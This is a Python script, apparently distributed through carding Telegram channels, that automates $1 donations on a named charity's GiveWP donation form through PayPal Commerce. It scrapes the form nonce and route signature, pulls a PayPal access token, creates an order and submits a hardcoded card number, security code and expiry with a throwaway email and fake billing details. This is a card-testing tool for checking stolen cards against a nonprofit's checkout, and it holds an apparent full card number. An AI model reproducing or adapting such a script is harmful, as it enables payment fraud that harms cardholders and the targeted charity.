#CODE BY @MAST4CARD NO SELL FREE

#×===============================
#DONT FORGET JOİN MY CHANNEL!
#@FTX_COURSE
#@MAST4RCARD
#×===============================

import requests
from bs4 import BeautifulSoup
import html
import re
from urllib.parse import urlparse, parse_qs
from faker import Faker
import random


session=requests.Session()


headers = {
    'authority': 'soule-foundation.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://soule-foundation.org/donation-form/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

params = {
    'givewp-route': 'donation-form-view',
    'form-id': '264641',
    'locale': 'en_US',
}

response = session.get('https://soule-foundation.org/', params=params, headers=headers)

html_text = response.text

id_match = re.search(r'"donationFormId":\s*(\d+)', html_text)
if id_match:
    form_id = id_match.group(1)
    print("donationFormId:", form_id)
else:
    print("donationFormId not found.")


nonce_match = re.search(r'"donationFormNonce":"(.*?)"', html_text)
if nonce_match:
    form_nonce = nonce_match.group(1)
    print("donationFormNonce:", form_nonce)
else:
    print("donationFormNonce not found.")

m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
if m:
    donate_url = html.unescape(m.group(1))
    parsed = urlparse(donate_url)
    q = parse_qs(parsed.query)

    sig = q.get("givewp-route-signature", ["Not found"])[0]
    exp = q.get("givewp-route-signature-expiration", ["Not found"])[0]

    print("Signature:", sig)
    print("Expiration:", exp)
else:
    print("donateUrl not found")
    


headers = {
    'authority': 'www.paypal.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://soule-foundation.org/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

params = {
    'style.label': 'paypal',
    'style.layout': 'vertical',
    'style.color': 'gold',
    'style.shape': 'rect',
    'style.tagline': 'false',
    'style.menuPlacement': 'below',
    'style.shouldApplyRebrandedStyles': 'false',
    'style.isButtonColorABTestMerchant': 'false',
    'allowBillingPayments': 'true',
    'applePaySupport': 'false',
    'buttonSessionID': 'uid_e7f12c7269_mdc6mjk6mzm',
    'buttonSize': 'large',
    'customerId': '',
    'clientID': 'BAAiO5DcFkSOsyZpJ0-yk9yxs0Z-uLSP0JUrIL0BvXctlH2i-Um4VYxdxYD6hNjXwg7CeKksWHICw74fkQ',
    'clientMetadataID': 'uid_15d7e1b6c4_mdc6mtq6nti',
    'commit': 'true',
    'components.0': 'buttons',
    'components.1': 'card-fields',
    'currency': 'USD',
    'debug': 'false',
    'disableFunding.0': 'credit',
    'disableSetCookie': 'true',
    'eagerOrderCreation': 'false',
    'enableFunding.0': 'venmo',
    'env': 'production',
    'experiment.enableVenmo': 'false',
    'experiment.venmoVaultWithoutPurchase': 'false',
    'experiment.spbEagerOrderCreation': 'false',
    'experiment.venmoWebEnabled': 'false',
    'experiment.isWebViewEnabled': 'false',
    'experiment.isPaypalRebrandEnabled': 'false',
    'experiment.isPaypalRebrandABTestEnabled': 'false',
    'experiment.defaultBlueButtonColor': 'defaultBlue_lightBlue',
    'experiment.venmoEnableWebOnNonNativeBrowser': 'false',
    'flow': 'purchase',
    'fundingEligibility': 'eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOmZhbHNlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJlbG8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJqY2IiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJtYWVzdHJvIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaW5lcnMiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImN1cCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiY2JfbmF0aW9uYWxlIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6dHJ1ZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzYXRpc3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYWlkeSI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ',
    'intent': 'capture',
    'jsSdkLibrary': 'paypal-js',
    'locale.country': 'IN',
    'locale.lang': 'en',
    'hasShippingCallback': 'false',
    'platform': 'mobile',
    'renderedButtons.0': 'paypal',
    'sessionID': 'uid_15d7e1b6c4_mdc6mtq6nti',
    'sdkCorrelationID': 'f915935bed8b3',
    'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9pbnRlbnQ9Y2FwdHVyZSZ2YXVsdD1mYWxzZSZjdXJyZW5jeT1VU0QmY2xpZW50LWlkPUJBQWlPNURjRmtTT3N5WnBKMC15azl5eHMwWi11TFNQMEpVcklMMEJ2WGN0bEgyaS1VbTRWWXhkeFlENmhOalh3ZzdDZUtrc1dISUN3NzRma1EmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZjb21wb25lbnRzPWJ1dHRvbnMsY2FyZC1maWVsZHMmZW5hYmxlLWZ1bmRpbmc9dmVubW8iLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUFBDUFYyIiwiZGF0YS11aWQiOiJ1aWRfaXNvY2x0aHRocHNzZWd1Z3Npam5vbWVta2NhbXBuIn19',
    'sdkVersion': '5.0.502',
    'storageID': 'uid_a0414e081a_mdc6mtq6nti',
    'buttonColor.shouldApplyRebrandedStyles': 'false',
    'buttonColor.color': 'gold',
    'buttonColor.isButtonColorABTestMerchant': 'false',
    'supportedNativeBrowser': 'true',
    'supportsPopups': 'true',
    'vault': 'false',
}

response = session.get('https://www.paypal.com/smart/buttons', params=params,headers=headers)



html_text = response.text   

match = re.search(r'"facilitatorAccessToken"\s*:\s*"([^"]+)"', html_text)
if match:
    token = match.group(1)
    print("facilitatorAccessToken:", token)
else:
    print("Not found")


headers = {
    'authority': 'soule-foundation.org',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type':"application/x-www-form-urlencoded; charset=UTF-8",  
    'origin': 'https://soule-foundation.org',
    'referer': 'https://soule-foundation.org/?givewp-route=donation-form-view&form-id=264641&locale=en_US',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

params = {
    'action': 'give_paypal_commerce_create_order',
}

data = {
    'give-form-id': form_id, 
    'give-form-hash': form_nonce,
    'give_payment_mode': 'paypal-commerce',
    'give-amount': '1',
    'give-recurring-period': 'undefined',
    'period': 'undefined',
    'frequency': 'undefined',
    'times': 'undefined',
    'give_first': 'John',
    'give_last': 'David',
    'give_email': 'wibase9779@safetoca.com',
    'card_address': 'Street 14th',
    'card_address_2': 'undefined',
    'card_city': 'New york',
    'card_state': 'NY',
    'card_zip': '10080',
    'billing_country': 'US',
    'give-cs-form-currency': 'USD',
}



response = session.post(
    'https://soule-foundation.org/wp-admin/admin-ajax.php',
    params=params,
    headers=headers,
    data=data,
)


id=response.json()["data"]["id"]
print(id)



headers = {
    'authority': 'www.paypal.com',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {token}', 
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'paypal-client-metadata-id': 'uid_72c80a9d81_mdc6nde6nta',
    'paypal-partner-attribution-id': '',
    'prefer': 'return=representation',
    'referer': 'https://www.paypal.com/smart/card-field?type=number&clientID=BAAiO5DcFkSOsyZpJ0-yk9yxs0Z-uLSP0JUrIL0BvXctlH2i-Um4VYxdxYD6hNjXwg7CeKksWHICw74fkQ&sessionID=uid_72c80a9d81_mdc6nde6nta&clientMetadataID=uid_72c80a9d81_mdc6nde6nta&cardFieldsSessionID=uid_37d7b7ad75_mdc6ndq6mzq&env=production&debug=false&locale.country=IN&locale.lang=en&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9pbnRlbnQ9Y2FwdHVyZSZ2YXVsdD1mYWxzZSZjdXJyZW5jeT1VU0QmY2xpZW50LWlkPUJBQWlPNURjRmtTT3N5WnBKMC15azl5eHMwWi11TFNQMEpVcklMMEJ2WGN0bEgyaS1VbTRWWXhkeFlENmhOalh3ZzdDZUtrc1dISUN3NzRma1EmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZjb21wb25lbnRzPWJ1dHRvbnMsY2FyZC1maWVsZHMmZW5hYmxlLWZ1bmRpbmc9dmVubW8iLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUFBDUFYyIiwiZGF0YS11aWQiOiJ1aWRfaXNvY2x0aHRocHNzZWd1Z3Npam5vbWVta2NhbXBuIn19&disable-card=&currency=USD&intent=capture&commit=true&vault=false&sdkCorrelationID=f915935bed8b3',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

json_data = {
    'payment_source': {
        'card': {
            'number': '5523389018553010',
            'security_code': '417',
            'expiry': '2028-01',
        },
    },
}

response = session.post(
    f'https://www.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
    headers=headers,
    json=json_data,
)

print(response.text)



headers = {
    'authority': 'soule-foundation.org',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
    'origin': 'https://soule-foundation.org',
    'referer': 'https://soule-foundation.org/?givewp-route=donation-form-view&form-id=264641&locale=en_US',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

params = {
    'givewp-route': 'donate',
    'givewp-route-signature': sig,
    'givewp-route-signature-id': 'givewp-donate',
    'givewp-route-signature-expiration': exp,
}

data = {
    'amount': '1',
    'currency': 'USD',
    'donationType': 'single',
    'formId': '264641',
    'gatewayId': 'paypal-commerce',
    'dtd': 'undefined',
    'firstName': 'John',
    'lastName': 'David',
    'email': 'wibase9779@safetoca.com',
    'country': 'US',
    'address1': 'Street 14th',
    'address2': '',
    'city': 'New york',
    'state': 'NY',
    'zip': '10080',
    'mailchimp': 'false',
    'donationBirthday': '',
    'originUrl': 'https://soule-foundation.org/donation-form/',
    'isEmbed': 'true',
    'embedId': 'give-form-shortcode-1',
    'locale': 'en_US',
    'gatewayData[payPalOrderId]': id,
}

response = session.post('https://soule-foundation.org/', params=params, headers=headers,data=data)

print(response.text)

